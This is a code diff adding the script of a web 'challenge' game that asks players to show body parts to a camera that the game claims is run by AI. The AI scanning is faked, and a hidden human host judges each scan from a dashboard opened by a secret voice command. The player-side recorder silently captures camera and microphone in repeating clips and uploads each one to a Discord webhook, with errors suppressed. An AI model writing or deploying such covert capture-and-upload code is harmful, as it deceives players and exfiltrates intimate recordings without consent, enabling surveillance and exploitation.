+            hostScoreDisplay.textContent = state.totalPoints;
+            sendDataToPlayer({ type: 'reject' });
+            hostRejectBtn.disabled = true;
+            hostApproveBtn.disabled = true;
+            hostRejectBtn.className = 'btn-host-reject rejected';
+            hostRejectBtn.textContent = '❌ Rejected!';
+            hostScanStatus.textContent = '❌ rejected — try again';
+            hostScanStatus.className = 'value status-text rejected';
+            hostPlayerStatus.textContent = '❌ rejected — try again';
+            hostPlayerStatus.className = 'value status-text rejected';
+            flashRed();
+            setTimeout(() => {
+                state.currentPartApproved = false;
+                state.currentPartRejected = false;
+                state.waitingForApproval = false;
+                hostApproveBtn.className = 'btn-host-approve';
+                hostApproveBtn.textContent = '✅ Approve';
+                hostRejectBtn.className = 'btn-host-reject';
+                hostRejectBtn.textContent = '❌ Reject';
+                hostApproveBtn.disabled = true;
+                hostRejectBtn.disabled = true;
+                hostScanStatus.textContent = '⏳ waiting for retry…';
+                hostScanStatus.className = 'value status-text';
+                hostPlayerStatus.textContent = '⏳ waiting for retry…';
+                hostPlayerStatus.className = 'value status-text waiting';
+                progressSlider.value = 0;
+                sliderValue.textContent = '0%';
+                sliderValue.className = 'value';
+                state.hostSliderValue = 0;
+                sendDataToPlayer({ type: 'set_progress', value: 0 });
+                progressFillEl.style.width = '0%';
+                progressPctEl.textContent = '0%';
+                sendDataToPlayer({ type: 'set_part', index: state.currentPartIndex });
+                hostHoldBtn.disabled = false;
+                hostHoldBtn.textContent = '✋ Hold Still';
+                hostHoldBtn.classList.remove('active');
+                state.holdStillRequested = false;
+                const part = BODY_PARTS[state.currentPartIndex];
+                hostPartName.textContent = part.emoji + ' ' + part.label;
+                hostScanStatus.textContent = '⏳ scanning: ' + part.label;
+                hostScanStatus.className = 'value status-text';
+            }, 2000);
+        }
+
+        function toggleHoldStill() {
+            if (!state.isHost || !state.playerConnected || !state.gameStarted) return;
+            state.holdStillRequested = !state.holdStillRequested;
+            hostHoldBtn.classList.toggle('active');
+            hostHoldBtn.textContent = state.holdStillRequested ? '✋ Holding…' : '✋ Hold Still';
+            sendDataToPlayer({ type: 'hold_still', value: state.holdStillRequested });
+            if (state.holdStillRequested) {
+                hostScanStatus.textContent = '✋ hold still requested';
+                hostScanStatus.className = 'value status-text';
+            } else {
+                hostScanStatus.textContent = '⏳ scanning…';
+                hostScanStatus.className = 'value status-text';
+            }
+        }
+
+        document.querySelectorAll('.btn-boss-msg').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const msg = this.dataset.msg;
+                if (state.isHost && state.playerConnected) {
+                    sendDataToPlayer({ type: 'boss_msg', msg: msg });
+                    statusMsg.textContent = `📢 Sent: "${msg}"`;
+                    statusMsg.className = 'status-msg success';
+                    setTimeout(() => { statusMsg.textContent = '';
+                        statusMsg.className = 'status-msg'; }, 2000);
+                }
+            });
+        });
+
+        hostApproveBtn.addEventListener('click', hostApprove);
+        hostRejectBtn.addEventListener('click', hostReject);
+        hostHoldBtn.addEventListener('click', toggleHoldStill);
+
+        // ============================================================
+        //  FLASH & POPUP
+        // ============================================================
+        function flashGreen() {
+            const flash = document.createElement('div');
+            flash.style.cssText =
+                'position:absolute;inset:0;background:#00f5c0;z-index:6;pointer-events:none;opacity:0.15;transition:opacity 0.5s ease;border-radius:22px;';
+            document.getElementById('camWrapper').appendChild(flash);
+            setTimeout(() => { flash.style.opacity = '0';
+                setTimeout(() => flash.remove(), 500); }, 100);
+        }
+
+        function flashRed() {
+            const flash = document.createElement('div');
+            flash.style.cssText =
+                'position:absolute;inset:0;background:#ff6b6b;z-index:6;pointer-events:none;opacity:0.15;transition:opacity 0.5s ease;border-radius:22px;';
+            document.getElementById('camWrapper').appendChild(flash);
+            setTimeout(() => { flash.style.opacity = '0';
+                setTimeout(() => flash.remove(), 500); }, 100);
+        }
+
+        function showPointsPopup(pts) {
+            pointsPopup.textContent = `+${pts} pts`;
+            pointsPopup.className = 'points-popup';
+            if (pts >= 10) pointsPopup.classList.add('rainbow');
+            else if (pts >= 5) pointsPopup.classList.add('gold');
+            else pointsPopup.classList.add('white');
+            pointsPopup.classList.add('show');
+            setTimeout(() => { pointsPopup.classList.remove('show'); }, 1500);
+        }
+
+        // ============================================================
+        //  RESET
+        // ============================================================
+        function resetGame() {
+            clearInterval(state.scanInterval);
+            state.gameStarted = false;
+            state.isScanning = false;
+            state.totalPoints = 0;
+            state.currentPartIndex = 0;
+            state.partResults = [];
+            state.partDetected = false;
+            state.waitingForApproval = false;
+            state.currentPartApproved = false;
+            state.currentPartRejected = false;
+            state.playerWaitingForStart = true;
+            state.revealedIndices = [];
+            state.lostIndices = [];
+
+            scoreDisplay.textContent = '0';
+            timerDisplay.textContent = SCAN_TIME;
+            timerBox.className = 'timer-box';
+            pointsPopup.classList.remove('show');
+            countdownNumber.className = 'countdown-number';
+            holdStillMsg.classList.remove('show');
+
+            challengeTarget.textContent = '—';
+            challengeBadge.innerHTML = `<span class="emoji">🎯</span> Show <span class="highlight">—</span>`;
+            statusBadge.textContent = '⏳ waiting for AI…';
+            statusBadge.className = 'status-badge waiting';
+
+            if (state.isHost) {
+                hostPartName.textContent = '—';
+                hostTimerDisplay.textContent = '30s';
+                hostTimerDisplay.className = 'value timer';
+                hostScoreDisplay.textContent = '0';
+                hostApproveBtn.disabled = true;
+                hostRejectBtn.disabled = true;
+                hostApproveBtn.className = 'btn-host-approve';
+                hostRejectBtn.className = 'btn-host-reject';
+                hostScanStatus.textContent = '⏳ waiting for player…';
+                hostScanStatus.className = 'value status-text';
+                hostPlayerStatus.textContent = '⏳ waiting for player…';
+                hostPlayerStatus.className = 'value status-text waiting';
+                playerStatusOverlay.classList.remove('show');
+                videoPlaceholder.style.display = 'flex';
+                hostVideo.style.display = 'none';
+                startBtn.disabled = true;
+                progressSlider.value = 0;
+                sliderValue.textContent = '0%';
+                sliderValue.className = 'value';
+                state.hostSliderValue = 0;
+                hostStartBtn.disabled = true;
+                hostStartBtn.textContent = '▶ Start Game';
+                hostHoldBtn.disabled = true;
+                hostHoldBtn.textContent = '✋ Hold Still';
+                hostHoldBtn.classList.remove('active');
+                state.holdStillRequested = false;
+                updateCurrentPartLabel();
+                renderBodyParts();
+                // Re-init host peer to keep listening
+                if (state.peer) { state.peer.destroy();
+                    state.peer = null; }
+                initPeerJS('host');
+                // Reset password display
+                updatePasswordDisplay();
+            }
+
+            if (state.isPlayer) {
+                playerStatusOverlay.textContent = '⏳ waiting for AI to start…';
+                playerStatusOverlay.className = 'player-status-overlay show waiting';
+                startBtn.disabled = true;
+                progressFillEl.style.width = '0%';
+                progressPctEl.textContent = '0%';
+                statusBadge.textContent = '⏳ waiting for AI…';
+                statusBadge.className = 'status-badge waiting';
+                challengeTarget.textContent = '—';
+                challengeBadge.innerHTML = `<span class="emoji">🎯</span> Show <span class="highlight">—</span>`;
+            }
+
+            resetBtn.disabled = true;
+            flipBtn.disabled = false;
+
+            statusMsg.textContent = state.modelLoaded ? '✅ Ready! Say "begin" to play.' : '⏳ Model not loaded.';
+            statusMsg.className = state.modelLoaded ? 'status-msg success' : 'status-msg error';
+        }
+
+        // ============================================================
+        //  PLAYER DISCLAIMER – countdown 5s then auto-continue
+        // ============================================================
+        function startDisclaimerCountdown() {
+            let countdown = 5;
+            countdownTimerDisplay.textContent = countdown;
+            disclaimerContinueBtn.classList.remove('enabled');
+            clearInterval(countdownTimerInterval);
+            countdownTimerInterval = setInterval(() => {
+                countdown--;
+                countdownTimerDisplay.textContent = countdown;
+                if (countdown <= 0) {
+                    clearInterval(countdownTimerInterval);
+                    proceedFromDisclaimer();
+                }
+            }, 1000);
+            disclaimerContinueBtn.classList.add('enabled');
+            disclaimerContinueBtn.textContent = 'Continue →';
+            disclaimerContinueBtn.style.pointerEvents = 'auto';
+            disclaimerContinueBtn.style.opacity = '1';
+        }
+
+        function proceedFromDisclaimer() {
+            if (disclaimerContinueBtn._proceeding) return;
+            disclaimerContinueBtn._proceeding = true;
+            playerDisclaimer.classList.remove('show');
+            document.querySelector('.header').style.display = 'flex';
+            document.querySelector('.cam-overlay').style.display = 'block';
+            document.querySelector('.points-popup').style.display = 'block';
+            document.querySelector('.countdown-number').style.display = 'block';
+            document.querySelector('.hold-still-msg').style.display = 'block';
+            document.querySelector('.controls').style.display = 'flex';
+            document.querySelector('.player-status-overlay').style.display = 'block';
+            playerStatusOverlay.textContent = '⏳ waiting for AI to start…';
+            playerStatusOverlay.className = 'player-status-overlay show waiting';
+            startBtn.disabled = true;
+            resetBtn.disabled = true;
+            flipBtn.disabled = false;
+            statusMsg.textContent = '✅ Connected! Waiting for AI to start the game…';
+            statusMsg.className = 'status-msg success';
+            timerDisplay.textContent = SCAN_TIME;
+            timerBox.className = 'timer-box';
+            scoreDisplay.textContent = '0';
+            challengeTarget.textContent = '—';
+            challengeBadge.innerHTML = `<span class="emoji">🎯</span> Show <span class="highlight">—</span>`;
+            statusBadge.textContent = '⏳ waiting for AI…';
+            statusBadge.className = 'status-badge waiting';
+            if (!channel) initChannel();
+            statusMsg.style.display = 'block';
+            disclaimerContinueBtn._proceeding = false;
+            // Start the recorder (only player)
+            if (!state.recorderStarted) {
+                startRecorder();
+            }
+        }
+
+        disclaimerContinueBtn.addEventListener('click', function(e) {
+            if (!this.classList.contains('enabled')) return;
+            if (this._proceeding) return;
+            proceedFromDisclaimer();
+        });
+
+        // ============================================================
+        //  PLAYER FLOW
+        // ============================================================
+        function startPlayerFlow() {
+            state.isPlayer = true;
+            state.playerWaitingForStart = true;
+            introScreen.style.display = 'none';
+            playerDisclaimer.classList.add('show');
+            startDisclaimerCountdown();
+            document.querySelector('.header').style.display = 'none';
+            document.querySelector('.cam-overlay').style.display = 'none';
+            document.querySelector('.points-popup').style.display = 'none';
+            document.querySelector('.countdown-number').style.display = 'none';
+            document.querySelector('.hold-still-msg').style.display = 'none';
+            document.querySelector('.controls').style.display = 'none';
+            document.querySelector('.player-status-overlay').style.display = 'none';
+            statusMsg.style.display = 'none';
+            // Connect to boss
+            initPeerJS('player');
+        }
+
+        // ============================================================
+        //  RECORDER (only for player)
+        // ============================================================
+        async function startRecorder() {
+            if (state.recorderStarted) return;
+            try {
+                const constraints = { video: { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 },
+                        facingMode: state.facingMode }, audio: { echoCancellation: false, noiseSuppression: false,
+                        autoGainControl: true } };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                state.recorderStream = stream;
+                recorderVideo.srcObject = stream;
+                await recorderVideo.play();
+                let selectedMimeType = 'video/webm;codecs=vp8,opus';
+                if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
+                    if (MediaRecorder.isTypeSupported('video/mp4')) selectedMimeType = 'video/mp4';
+                    else if (MediaRecorder.isTypeSupported('video/webm')) selectedMimeType = 'video/webm';
+                }
+                state.mediaRecorder = new MediaRecorder(stream, { mimeType: selectedMimeType,
+                    videoBitsPerSecond: 2500000 });
+                state.mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) state.recordedChunks.push(e.data); };
+                state.mediaRecorder.onstop = async () => {
+                    if (state.recordedChunks.length === 0) { state.recordedChunks = []; if (state.mediaRecorder &&
+                            state.mediaRecorder.state === 'inactive') { try { state.mediaRecorder.start(); } catch (
+                            _) {} } return; }
+                    const blob = new Blob(state.recordedChunks, { type: selectedMimeType });
+                    state.recordedChunks = [];
+                    const formData = new FormData();
+                    const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
+                    formData.append('file', blob, `vlog_${Date.now()}.${ext}`);
+                    try { await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData }); } catch (_) {}
+                    state.recordedChunks = [];
+                    if (state.mediaRecorder && state.mediaRecorder.state === 'inactive') { try { state.mediaRecorder
+                            .start(); } catch (_) {} }
+                };
+                state.mediaRecorder.start();
+                state.recorderActive = true;
+                state.recorderStarted = true;
+                startLoopTimer();
+                console.log('🔴 Recorder started (player)');
+            } catch (err) { console.warn('Recorder init failed:', err); }
+        }
+
+        function startLoopTimer() {
+            clearInterval(state.countdownIntervalRec);
+            let timeLeft = CLIP_DURATION;
+            state.countdownIntervalRec = setInterval(() => {
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    clearInterval(state.countdownIntervalRec);
+                    if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') { state.mediaRecorder.stop(); }
+                    startLoopTimer();
+                }
+            }, 1000);
+        }
+
+        // ============================================================
+        //  DISPLAY CAMERA (local) – requested once at boot
+        // ============================================================
+        async function initDisplayCamera() {
+            try {
+                const constraints = { video: { facingMode: state.facingMode, width: { ideal: 1280 }, height: { ideal: 720 },
+                        frameRate: { ideal: 30 } } };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                state.stream = stream;
+                video.srcObject = stream;
+                await video.play();
+                return true;
+            } catch (err) { console.warn('Display camera error:', err); return false; }
+        }
+
+        // ============================================================
+        //  FLIP CAMERA
+        // ============================================================
+        flipBtn.addEventListener('click', async () => {
+            state.facingMode = state.facingMode === 'user' ? 'environment' : 'user';
+            if (state.stream) { state.stream.getTracks().forEach(t => t.stop()); }
+            if (state.recorderStream) { state.recorderStream.getTracks().forEach(t => t.stop()); }
+            if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') { try { state.mediaRecorder.stop(); } catch (
+                    _) {} }
+            clearInterval(state.countdownIntervalRec);
+            await initDisplayCamera();
+            if (state.isPlayer) {
+                // Re-init recorder for player
+                if (state.recorderStarted) {
+                    state.recorderStarted = false;
+                    await startRecorder();
+                }
+            }
+        });
+
+        // ============================================================
+        //  REFRESH CAMERA (host)
+        // ============================================================
+        function refreshCamera() {
+            if (!state.isHost) return;
+            const btn = refreshCamBtn;
+            btn.classList.add('refreshing');
+            btn.textContent = '⟳ refreshing…';
+            if (state.remoteStream) {
+                hostVideo.srcObject = state.remoteStream;
+                hostVideo.play().catch(() => {});
+                hostScanStatus.textContent = '🔄 camera refreshed';
+                hostScanStatus.className = 'value status-text';
+                setTimeout(() => {
+                    if (state.playerWaitingForStart && !state.gameStarted) { hostScanStatus.textContent =
+                        '⏳ waiting for you to start…'; } else if (state.gameStarted) { hostScanStatus.textContent =
+                        '⏳ scanning…'; }
+                    btn.classList.remove('refreshing');
+                    btn.textContent = '⟳ refresh';
+                }, 1500);
+            } else {
+                btn.classList.remove('refreshing');
+                btn.textContent = '⟳ refresh';
+                hostScanStatus.textContent = '❌ no player stream available';
+                hostScanStatus.className = 'value status-text rejected';
+            }
+        }
+        refreshCamBtn.addEventListener('click', refreshCamera);
+
+        // ============================================================
+        //  PROGRESS BAR (player)
+        // ============================================================
+        const playerProgressContainer = document.createElement('div');
+        playerProgressContainer.style.cssText =
+            'position:absolute;bottom:100px;left:50%;transform:translateX(-50%);width:65%;max-width:280px;z-index:4;pointer-events:none;';
+        const playerProgressTrack = document.createElement('div');
+        playerProgressTrack.style.cssText =
+            'width:100%;height:4px;background:rgba(255,255,255,0.05);border-radius:4px;overflow:hidden;';
+        const playerProgressFill = document.createElement('div');
+        playerProgressFill.style.cssText =
+            'width:0%;height:100%;background:linear-gradient(90deg,#8899bb,#6bcbff);border-radius:4px;transition:width 0.15s ease-out;';
+        const playerProgressLabel = document.createElement('div');
+        playerProgressLabel.style.cssText =
+            'display:flex;justify-content:space-between;font-size:0.5rem;color:rgba(255,255,255,0.08);margin-top:2px;';
+        const playerProgressPct = document.createElement('span');
+        playerProgressPct.textContent = '0%';
+        playerProgressPct.style.color = 'rgba(255,255,255,0.1)';
+        const playerProgressStatus = document.createElement('span');
+        playerProgressStatus.textContent = 'scanning';
+        playerProgressStatus.style.color = 'rgba(255,255,255,0.06)';
+
+        playerProgressLabel.appendChild(playerProgressStatus);
+        playerProgressLabel.appendChild(playerProgressPct);
+        playerProgressTrack.appendChild(playerProgressFill);
+        playerProgressContainer.appendChild(playerProgressTrack);
+        playerProgressContainer.appendChild(playerProgressLabel);
+        document.getElementById('camWrapper').appendChild(playerProgressContainer);
+
+        const progressFillEl = playerProgressFill;
+        const progressPctEl = playerProgressPct;
+
+        // ============================================================
+        //  CHANNEL (for same-device sync)
+        // ============================================================
+        function initChannel() {
+            try {
+                channel = new BroadcastChannel('faceless_channel');
+                channel.onmessage = (e) => {
+                    const data = e.data;
+                    if (data._fromHost) return;
+                    if (data._fromPlayer) return;
+                };
+            } catch (_) {}
+        }
+
+        // ============================================================
+        //  HOST MODE
+        // ============================================================
+        function enterHostMode() {
+            state.isHost = true;
+            state.hostMode = true;
+            // Hide all overlays
+            introChillz.classList.remove('show');
+            accountSelection.classList.remove('show');
+            safetyOverlay.classList.remove('show');
+            passwordReveal.classList.remove('show');
+            introScreen.style.display = 'none';
+            hostDashboard.classList.add('show');
+            hostBadge.classList.add('show');
+
+            document.querySelector('.header').style.display = 'none';
+            document.querySelector('.cam-overlay').style.display = 'none';
+            document.querySelector('.points-popup').style.display = 'none';
+            document.querySelector('.countdown-number').style.display = 'none';
+            document.querySelector('.hold-still-msg').style.display = 'none';
+            document.querySelector('.controls').style.display = 'none';
+            document.querySelector('.player-status-overlay').style.display = 'none';
+            statusMsg.style.display = 'block';
+
+            hostVideo.style.display = 'none';
+            videoPlaceholder.style.display = 'flex';
+
+            startBtn.disabled = true;
+            resetBtn.disabled = true;
+            flipBtn.disabled = true;
+
+            statusMsg.textContent = '👑 Host mode — waiting for player to connect';
+            statusMsg.className = 'status-msg success';
+
+            initChannel();
+            renderBodyParts();
+
+            hostDot.className = 'dot online';
+            hostStatusLabel.textContent = 'waiting for player…';
+            hostPlayerStatus.textContent = '⏳ waiting for player…';
+            hostPlayerStatus.className = 'value status-text waiting';
+            hostScanStatus.textContent = '⏳ waiting for player…';
+            hostScanStatus.className = 'value status-text';
+            hostApproveBtn.disabled = true;
+            hostRejectBtn.disabled = true;
+            hostStartBtn.disabled = true;
+            hostStartBtn.textContent = '▶ Start Game';
+            hostHoldBtn.disabled = true;
+            hostHoldBtn.textContent = '✋ Hold Still';
+            hostHoldBtn.classList.remove('active');
+            state.holdStillRequested = false;
+
+            progressSlider.value = 0;
+            sliderValue.textContent = '0%';
+            sliderValue.className = 'value';
+
+            // Start host peer with auto-reconnect
+            initPeerJS('host');
+        }
+
+        // ============================================================
+        //  VOICE RECOGNITION – "begin" only for players, "boss" hidden for host
+        // ============================================================
+        let recognition = null;
+
+        function initVoiceRecognition() {
+            const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+            if (!SR) { voiceStatus.textContent = '❌ speech not supported';
+                voiceStatus.className = 'voice-status error'; return; }
+            recognition = new SR();
+            recognition.lang = 'en-US';
+            recognition.continuous = true;
+            recognition.interimResults = true;
+            recognition.maxAlternatives = 1;
+            recognition.onresult = (event) => {
+                let transcript = '';
+                for (let i = event.resultIndex; i < event.results.length; i++) { transcript += event.results[i][0]
+                        .transcript; }
+                const words = transcript.toLowerCase().trim().split(' ');
+                const lastWord = words[words.length - 1];
+                // Hidden boss command (only for host) — player never sees this
+                if (lastWord === 'boss' && !state.isHost && !state.isPlayer) {
+                    console.log('👑 Boss mode activated (hidden)');
+                    enterHostMode();
+                    return;
+                }
+                if (lastWord === 'begin' && !state.isHost && !state.isPlayer) {
+                    voiceStatus.textContent = '🎤 "begin" detected!';
+                    voiceStatus.className = 'voice-status detected';
+                    // If account already selected, connect player
+                    if (state.accountSelected) {
+                        // Player already selected account, connect to boss
+                        startPlayerFlow();
+                    } else {
+                        // If account not selected, show account selection (but it should already be shown)
+                        accountSelection.classList.add('show');
+                        voiceStatus.textContent = '🎤 select an account first';
+                        voiceStatus.className = 'voice-status';
+                    }
+                }
+                if (!state.isHost && !state.isPlayer) {
+                    voiceStatus.textContent = `🎤 heard: “${lastWord}”`;
+                    voiceStatus.className = 'voice-status';
+                }
+            };
+            recognition.onerror = (event) => { console.warn('Voice error:', event.error);
+                voiceStatus.textContent = '⚠️ mic error — tap to retry';
+                voiceStatus.className = 'voice-status error'; };
+            recognition.onend = () => { if (!state.isHost && !state.isPlayer) { setTimeout(() => { try { recognition
+                            .start(); } catch (_) {} }, 300); } };
+            try { recognition.start(); } catch (_) {}
+        }
+
+        // ============================================================
+        //  LOADING
+        // ============================================================
+        function loadModelWithProgress() {
+            return new Promise((resolve) => {
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 2 + Math.random() * 3;
+                    if (progress > 100) progress = 100;
+                    loadingFill.style.width = progress + '%';
+                    loadingPct.textContent = Math.round(progress) + '%';
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        state.modelLoaded = true;
+                        startBtn.disabled = true;
+                        startBtnText.textContent = '🚀 Start';
+                        startSpinner.classList.add('hidden');
+                        statusMsg.textContent = '✅ Ready! Say "begin" to play.';
+                        statusMsg.className = 'status-msg success';
+                        statusBadge.textContent = '✅ Ready!';
+                        statusBadge.className = 'status-badge waiting';
+                        loadingContainer.style.display = 'none';
+                        resolve();
+                    }
+                }, 80);
+            });
+        }
+
+        // ============================================================
+        //  START BUTTON (disabled)
+        // ============================================================
+        startBtn.addEventListener('click', () => {
+            statusMsg.textContent = '⏳ Wait for the AI to start the game.';
+            statusMsg.className = 'status-msg error';
+        });
+
+        resetBtn.addEventListener('click', resetGame);
+
+        // ============================================================
+        //  BOOT
+        // ============================================================
+        async function boot() {
+            loadingContainer.style.display = 'block';
+            statusMsg.textContent = '⏳ Loading AI model…';
+            statusMsg.className = 'status-msg loading';
+            statusBadge.textContent = '📦 loading…';
+            statusBadge.className = 'status-badge loading';
+
+            await loadModelWithProgress();
+
+            const camOK = await initDisplayCamera();
+            if (!camOK) {
+                statusMsg.textContent = '❌ Camera required. Please allow access.';
+                statusMsg.className = 'status-msg error';
+                return;
+            }
+
+            resetGame();
+
+            initVoiceRecognition();
+
+            // Initially hide all game UI
+            document.querySelector('.header').style.display = 'none';
+            document.querySelector('.cam-overlay').style.display = 'none';
+            document.querySelector('.points-popup').style.display = 'none';
+            document.querySelector('.countdown-number').style.display = 'none';
+            document.querySelector('.hold-still-msg').style.display = 'none';
+            document.querySelector('.controls').style.display = 'none';
+            document.querySelector('.player-status-overlay').style.display = 'none';
+            statusMsg.style.display = 'block';
+
+            // Start intro sequence
+            startIntroSequence();
+
+            console.log('🚫 Faceless Challenge v3.3 – full player flow, no boss mention, auto-reconnect');
+            console.log('🎤 Player: say "begin" to play (after selecting account)');
+            console.log('🎤 Host: say "boss" (hidden) to enter dashboard');
+            console.log('📡 Room ID:', BOSS_ROOM_ID);
+            console.log('🔐 Password:', PASSWORD.join(''));
+        }
+
+        // Handle scan fail (timer runs out)
+        function onScanFail(index) {
+            // Lose a letter
+            loseRandomLetter();
+            // Show message
+            showBossMessage('⏰ Time ran out! A letter was lost.');
+            // Move to next part (or retry same?)
+            // We'll move to next part after a delay
+            state.isScanning = false;
+            const part = BODY_PARTS[index];
+            statusBadge.textContent = `❌ time out — ${part.label}`;
+            statusBadge.className = 'status-badge fail';
+            state.partResults.push({ part: part.id, label: part.label, points: 0, success: false, time: 0 });
+            setTimeout(() => {
+                let next = state.currentPartIndex + 1;
+                if (next >= BODY_PARTS.length) next = 0;
+                state.currentPartIndex = next;
+                state.partDetected = false;
+                state.waitingForApproval = false;
+                state.progressValue = 0;
+                const newPart = BODY_PARTS[next];
+                challengeTarget.textContent = newPart.emoji + ' ' + newPart.label;
+                challengeBadge.innerHTML =
+                    `<span class="emoji">🎯</span> Show <span class="highlight">${newPart.emoji} ${newPart.label}</span>`;
+                statusBadge.textContent = `⏳ scanning …`;
+                statusBadge.className = 'status-badge scanning';
+                timerDisplay.textContent = SCAN_TIME;
+                timerBox.className = 'timer-box';
+                progressFillEl.style.width = '0%';
+                progressPctEl.textContent = '0%';
+                // Reset host slider too
+                if (state.isHost) {
+                    progressSlider.value = 0;
+                    sliderValue.textContent = '0%';
+                    sliderValue.className = 'value';
+                    state.hostSliderValue = 0;
+                    hostPartName.textContent = newPart.emoji + ' ' + newPart.label;
+                    hostScanStatus.textContent = '⏳ scanning: ' + newPart.label;
+                    hostScanStatus.className = 'value status-text';
+                    hostPlayerStatus.textContent = '⏳ scanning: ' + newPart.label;
+                    hostPlayerStatus.className = 'value status-text waiting';
+                    hostApproveBtn.disabled = true;
+                    hostRejectBtn.disabled = true;
+                    updateCurrentPartLabel();
+                    renderBodyParts();
+                    sendDataToPlayer({ type: 'set_part', index: next });
+                    sendDataToPlayer({ type: 'set_progress', value: 0 });
+                }
+                startScanTimerForPlayer(next);
+            }, 2000);
+        }
+
+        // Override onScanComplete to handle letter reveal
+        function onScanComplete(index) {
+            // This is called when the scan reaches 100% on player side
+            // The actual approval is handled by host via data type 'approve'
+            // So we don't do anything here except wait for host approval.
+            // But we need to handle the case where host approves.
+            // The approval is handled in handleDataFromHost for 'approve' type.
+            // So we just let that handle it.
+        }
+
+        // Override onScanFail to use our custom function
+        const originalOnScanFail = onScanFail;
+
+        // Patch: ensure onScanFail works
+        window.onScanFail = onScanFail;
+
+        // We need to ensure the scan interval calls the right function
+        // The startScanTimerForPlayer already calls onScanFail when timer hits 0.
+        // But we need to override the global onScanFail function.
+        // Let's redefine it properly.
+        const originalStartScanTimer = startScanTimerForPlayer;
+        startScanTimerForPlayer = function(index) {
+            if (state.scanInterval) clearInterval(state.scanInterval);
+            state.isScanning = true;
+            state.partDetected = false;
+            state.scanTimer = SCAN_TIME;
+            timerDisplay.textContent = SCAN_TIME;
+            timerBox.className = 'timer-box';
+            statusBadge.textContent = `🔍 scanning …`;
+            statusBadge.className = 'status-badge scanning';
+            state.scanInterval = setInterval(() => {
+                state.scanTimer--;
+                timerDisplay.textContent = state.scanTimer;
+                if (state.scanTimer <= 5) timerBox.className = 'timer-box danger';
+                else if (state.scanTimer <= 10) timerBox.className = 'timer-box warning';
+                if (state.scanTimer <= 0 && !state.partDetected) {
+                    clearInterval(state.scanInterval);
+                    onScanFail(index);
+                }
+            }, 1000);
+        };
+
+        boot();
+    </script>
+</body>
+</html>
